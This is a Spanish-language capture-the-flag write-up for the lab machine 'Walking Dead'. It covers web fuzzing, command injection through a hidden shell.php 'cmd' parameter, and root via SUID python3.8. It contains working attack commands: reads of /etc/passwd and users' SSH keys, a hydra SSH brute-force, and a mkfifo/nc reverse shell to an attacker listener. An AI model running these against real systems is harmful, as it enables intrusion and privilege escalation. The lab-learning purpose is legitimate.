# WALKING DEAD

> Dificultad: Fácil

___

#### FASE RECONOCIMIENTO

##### 1. ESCANEO

###### 1.1 del _Objetivo_:
`nmap -v -n -sV -sV --min-rate 5000 -Pn --open -oN escaneo [IP]`

> PORT   STATE SERVICE VERSION                                                      
> 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
>> | ssh-hostkey:                                                                    
>> |   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)                    
>> |   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)                   
>> |_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)                 
> 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                               
>> |_http-server-header: Apache/2.4.41 (Ubuntu)                                      
>> |_http-title: The Walking Dead - CTF                                              
>> | http-methods:                                                                   
>> |_  Supported Methods: OPTIONS HEAD GET POST                                      
> MAC Address: CE:BF:D6:20:93:90 (Unknown)                                          
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                           


###### 1.2 de la _Web App_:

* `whatweb [IP]`
	> `http://172.18.0.3 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.18.0.3], Title[The Walking Dead - CTF]`

* `nikto -h [IP]`
	> OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST.  
	> /hidden/: Directory indexing found.  
	> /hidden/: This might be interesting.  

##### 2. ENUMERACIÓN
	
###### de la _Web App_:

* _Directorios:_
	* `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -R 3 -u "http://172.18.0.3/FUZZ"`
		* /hidden/

Sólo hallamos a _/hidden/_.	Parece interesante.
	
* _Recursos (PHP-HTML-TXT...):_
	* `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u "http://172.18.0.3/FUZZ"`
	* `wfuzz -c --hc 404,403 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.3/FUZZ.FUZ2Z"`
		* /hidden/.shell.php    0 bytes   <==
		* /index.html
		* /backup.txt							200
			> Error 403: Forbidden. Directory listing is disabled.	?

Tres recursos, siendo el más interesante _/hidden/.shell.php_. Quizás, nuestra futura WebShell.

* _Recursos Ocultos:_
	* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/UnixDotfiles.fuzz.txt -u "http://172.18.0.3/hidden/FUZZ"`
	* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u "http://172.18.0.3/hidden/.FUZZ"`

No encontramos ninguno.
	
* _Subdominios_:
	* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -H "Host. FUZZ.[dominio]" -u "http://[dominio|IP]"`

Nada de subdominios.						
					
##### 3. BÚSQUEDA DE VULNERABILIDADES

###### 3.1 _Descargar Lógica PHPs_:

Quizás podamos entender qué hace el script (aunque pese 0 :S).
* `curl -O http://[IP]/hidden/.shell.php`	

Comprobamos que efectivamente no hay nada.

> Qué el script PHP no pese nada no significa que no sea relevante, puesto que puede importar la lógica de otro. Es un **_potencial Vector de Ataque_**.

###### 3.2 _Parámetros URL_:
Primero buscamos los más comunes:
* `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -u "http://[IP]/hidden/.shell.php?FUZZ=1"` 
* `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../rockyou.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=1"`

Nada por el momento.
  
###### 3.3 Posibles LFI:
* `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -u "http://[IP]/hidden/.shell.php?FUZZ=FUZ2Z"`

* `wfuzz -c --hc 403,404 --hh 0 -t 200 -z file,../lfi-params.txt -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.18.0.2/hidden/.shell.php?FUZZ=FUZ2Z"`

Nada de LFIs.
				
###### 3.4 Otros Parámetros:
* `wfuzz -c --hc 400,403,404 --hh 0 -t 200 -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u "http://[IP]/hidden/.shell.php?FUZZ=id"`

> Encuentra a _cmd__

Haciendo distintas pruebas en `/hidden/.shell.php?cmd=<comandos-os>`, vemos que podemos **Inyectar Comandos del Sistema** a través del mismo. Este es nuestro camino.

___

#### FASE EXPLOTACION

##### DEL SISTEMA
Antes de probar nuestra WebShell con _cmd_, podemos intentar algunas cosas para  _Enumerar el Sistema_, como **Usuarios y Claves Privadas**.  
A través del navegador hacemos lo siguiente:

###### Enumerar Usuarios

* http://[IP]/hidden/.shell.php?cmd=cat%20/etc/passwd
> [IMG]
> www-data  
> rick (bash)  
> negan (bash)  

###### Buscar Claves Privadas

* http://[IP]/hidden/.shell.php?cmd=cat%20/home/rick/.ssh/id_rsa
* http://[IP]/hidden/.shell.php?cmd=cat%20/home/negan/.ssh/id_rsa

Haciendo más pruebas, no encontramos ningún tipo de Clave.

###### Brutear Contraseñas

* `hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u

No matcheamos credenciales.

###### WebShell 
Ya que probamos varias cosas sin resultados, pasamos a intentar **Footholding del Sistema**.  
Nos ponemos a la escucha en nuestra máquina atacante con:

* `rlwrap nc -lnvp 6660`

Ahora corremos nuestra _RevShell/WebShell_:

`/hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff`

Hacemos `whoami` ==> `www-data`!
 
###### Mejorar la TTY

```
tty
which python python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
tty
```

Ahora tenemos una PTY.

___
		 
#### FASE POST-EXPLOTACIÓN (Elevar Privilegios)
Ya que tenemos acceso al sistema en un entorno más controlado y funcional, pasamos **Listar Home de Usuarios**.  
Aunque ya los habíamos Enumerado, debemos ver si encontramos, en sus archivos personales, algún Vector:  

`ls -Ral /home/`
> negan  
> rick  
> wwdata  
> www-data  
>> /home/www-data/hijack.py 

Nuestro usuario (www-data) parece tener un script que parecería ser explotable: `/home/www-data/hijack.py`. Debemos ver su lógica. Hacemos:

`cat /home/www-data/hijack.py`  
> -e #!/usr/bin/env python3  
> import os
> import pty  
> os.system("/usr/local/bin/wwwdata_vuln")  
> pty.spawn("/bin/bash")  

`cat /usr/local/bin/wwwdata_vuln`  
> -e #!/bin/bash                 
> /bin/bash                      

Haciendo varios intentos, nos damos cuenta que en realidad este no es el camino, son distracciones, por lo cual debemos ir por otro lado.

###### Búsqueda de Binarios SUID

Una de las primera cosas que hay probar para **Elevar Privilegios** apenas entramos al sistema, es hallar estos binarios:


`find / -type f -perm -4000 2>/dev/null`  
> /usr/lib/openssh/ssh-keysign  
> /usr/lib/dbus-1.0/dbus-daemon-launch-helper  
> /usr/bin/man  
> /usr/bin/gpasswd  
> /usr/bin/mount  
> /usr/bin/umount  
> /usr/bin/chfn  
> /usr/bin/passwd  
> /usr/bin/su  
> /usr/bin/newgrp  
> /usr/bin/chsh  
> /usr/bin/python3.8 <===  
> /usr/bin/sudo

Vemos que `python3.` está muy interesante y vamos a [GTFOBins](https://gtfobins.github.io/). Comprobamos que es vulnerable a _Explotación SUID_ y terminamos corriendo:

* `/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

Hacemos `whoami` y comprobamos que somos `root`. Eso es todo!

___

#### MITIGACIONES
1. Sanear los Parámetros URL
2. Robustecer las contraseñas
3. Cuidado al otorgar permisos SUID a binarios explotables
